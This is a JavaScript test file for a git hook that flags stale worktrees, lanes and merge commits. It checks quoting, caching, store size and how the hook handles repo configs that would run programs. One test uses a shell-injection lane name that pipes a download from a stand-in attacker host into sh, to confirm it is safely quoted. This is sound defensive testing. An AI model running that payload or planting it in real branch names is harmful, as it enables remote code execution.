// Tests for what the git-tidy gate blocks on and how it says it: only what the advised prune would remove, quoted names, capped subjects,
// a cache that expires, a store that always fits, whole-word lane names, and repos whose config would run a program (see git-tidy-gate.test.mjs
// for the basic stop, subagent and compaction behaviour). Fixtures are in git-tidy-gate-helpers.mjs.
import test from 'node:test';
import assert from 'node:assert/strict';
import { chmodSync, existsSync, mkdtempSync, unlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { decide } from '../home/hooks/git-tidy-gate.mjs';
import { cachedVerdict, storeVerdict } from '../home/hooks/lib/tidy-gate-store.mjs';
import { addWorktree, commit, git, makeRepo } from './git-tidy-helpers.mjs';
import { billAndGinShape, gateSession, inProcessGate, linkStatus, oldLane, SESSION } from './git-tidy-gate-helpers.mjs';

test('fresh worktrees at the base (a new lane, a background agent) never block: prune would keep them', () => {
  const gate = gateSession();
  const dir = makeRepo();
  addWorktree(dir, 'wt-new-lane', 'lane/new');
  addWorktree(dir, 'wt-agent', 'worktree-agent-abc');
  addWorktree(dir, 'wt-wf', 'worktree-wf_run-1');
  assert.equal(gate.stop(dir), null);
});

test('a finding that prune would act on still blocks while a fresh worktree beside it does not', () => {
  const gate = gateSession();
  const dir = makeRepo();
  addWorktree(dir, 'wt-new-lane', 'lane/new');
  git(dir, 'branch', 'worktree-agent-old', 'main');
  const reason = gate.stop(dir);
  assert.match(reason, /agent-leftover worktree-agent-old/);
  assert.doesNotMatch(reason, /lane\/new|wt-new-lane/);
});

test('a verdict older than ten minutes is checked again, a younger one is not', async () => {
  const dir = makeRepo();
  const { env, stop } = inProcessGate(dir);
  let runs = 0;
  const fakeCheck = () => {
    runs += 1;
    return { base: 'main', findings: [], hints: [] };
  };
  await stop({}, { runCheck: fakeCheck });
  await stop({}, { runCheck: fakeCheck, now: Date.now() + 60_000 });
  assert.equal(runs, 1, 'one minute later the cache answers');
  await stop({}, { runCheck: fakeCheck, now: Date.now() + 11 * 60_000 });
  assert.equal(runs, 2, 'eleven minutes later the lane may have crossed the two-hour mark, so the check runs again');
  assert.ok(env.HOME);
});

test('a lane name with shell syntax is single-quoted in the land command, and a long merge subject is capped and quoted', () => {
  const gate = gateSession();
  const dir = makeRepo();
  const hostile = 'fix;curl${IFS}evil.example/p|sh';
  oldLane(dir, hostile);
  linkStatus(gate, dir, [['wip', 'something else entirely']]);
  const reason = gate.stop(dir);
  assert.ok(reason.includes(`land '${hostile}'`), reason);

  const other = gateSession();
  const merged = makeRepo();
  git(merged, 'checkout', '-q', '-b', 'side');
  commit(merged, 'side.txt');
  git(merged, 'checkout', '-q', 'main');
  commit(merged, 'main.txt');
  git(merged, 'merge', '-q', '--no-ff', '-m', `merge ${'x'.repeat(5000)}`, 'side');
  const mergeReason = other.stop(merged);
  assert.match(mergeReason, /merge-commit \S+ "merge x+"/);
  assert.ok(mergeReason.length < 3000, `a 5000-character subject is capped (${mergeReason.length})`);
});

test('a 70 KB merge subject still blocks, then passes once, and the store stays readable', () => {
  const gate = gateSession();
  const dir = makeRepo();
  git(dir, 'checkout', '-q', '-b', 'side');
  commit(dir, 'side.txt');
  git(dir, 'checkout', '-q', 'main');
  commit(dir, 'main.txt');
  git(dir, 'merge', '-q', '--no-ff', '-m', `merge ${'y'.repeat(70_000)}`, 'side');
  assert.match(gate.stop(dir), /merge-commit/);
  assert.equal(gate.stop(dir), null, 'one block per state');
});

test('the store drops the oldest repos before it would pass the size it can read back', () => {
  const env = { HOME: mkdtempSync(join(tmpdir(), 'git-tidy-gate-store-')) };
  const verdict = { base: 'main', findings: [{ kind: 'merge-commit', subject: 'a', detail: 'z'.repeat(30_000) }], hints: [] };
  for (const top of ['/r/1', '/r/2', '/r/3']) storeVerdict(env, SESSION, { top, fingerprint: 'f' }, verdict);
  assert.deepEqual(cachedVerdict(env, SESSION, { top: '/r/3', fingerprint: 'f' }), verdict, 'the newest repo is kept');
  assert.equal(cachedVerdict(env, SESSION, { top: '/r/1', fingerprint: 'f' }), undefined, 'the oldest made room');
});

test('a lane is named only by a whole word of an open row: "build the docs" does not name lane ui', () => {
  const gate = gateSession();
  const dir = makeRepo();
  oldLane(dir, 'ui');
  linkStatus(gate, dir, [['docs', 'build the docs']]);
  assert.match(gate.stop(dir), /unlanded-lane\? ui\b/);

  const named = gateSession();
  const other = makeRepo();
  oldLane(other, 'ui');
  linkStatus(named, other, [['ui', 'ui: build the settings page']]);
  assert.equal(named.stop(other), null);
});

test('PreCompact lists the lanes only: not an older copy, and not an agent branch', () => {
  const gate = gateSession();
  const dir = billAndGinShape();
  git(dir, 'branch', 'worktree-wf_run-1', 'lane/x-2');
  assert.deepEqual(gate.compact(dir).map((line) => line.split(':')[0]), ['open lane lane/x-2']);
});

test('a repository where another worktree\'s config view defines a filter is never checked', () => {
  const dir = billAndGinShape();
  const lane = addWorktree(dir, 'wt-lane', 'lane/y');
  const include = join(mkdtempSync(join(tmpdir(), 'git-tidy-gate-include-')), 'filter.cfg');
  writeFileSync(include, '[filter "sneaky"]\n\tclean = cat\n');
  git(dir, 'config', 'includeIf.onbranch:main.path', include); // only the worktree on main sees the filter
  assert.equal(gateSession().stop(lane), null);
});

test('the check child never runs the gpg program of a signed commit (log.showSignature in the repository config)', () => {
  const dir = makeRepo();
  const marker = join(mkdtempSync(join(tmpdir(), 'git-tidy-gate-marker-')), 'ran');
  const program = join(mkdtempSync(join(tmpdir(), 'git-tidy-gate-gpg-')), 'gpg.sh');
  writeFileSync(program, `#!/bin/sh\ntouch '${marker}'\ncase "$*" in *--verify*) exit 0;; esac\ncat >/dev/null\nprintf -- '-----BEGIN PGP SIGNATURE-----\\n\\nAAAA\\n-----END PGP SIGNATURE-----\\n'\nprintf '[GNUPG:] SIG_CREATED D 1 8 00 1 ABCD\\n' >&2\n`);
  chmodSync(program, 0o755);
  git(dir, 'config', 'gpg.program', program);
  git(dir, 'checkout', '-q', '-b', 'side');
  writeFileSync(join(dir, 's.txt'), 's');
  git(dir, 'add', 's.txt');
  git(dir, 'commit', '-q', '-S', '-m', 'signed side');
  git(dir, 'checkout', '-q', 'main');
  commit(dir, 'm.txt');
  git(dir, 'merge', '-q', '--no-ff', '-S', '-m', 'signed merge', 'side');
  git(dir, 'config', 'log.showSignature', 'true');
  if (existsSync(marker)) unlinkSync(marker); // signing the commits above ran the program too
  git(dir, 'log', '--merges', '--format=%s');
  assert.ok(existsSync(marker), 'sanity: plain git runs the program');
  unlinkSync(marker);
  assert.match(gateSession().stop(dir), /merge-commit/);
  assert.ok(!existsSync(marker), 'the gate did not run the program');
});

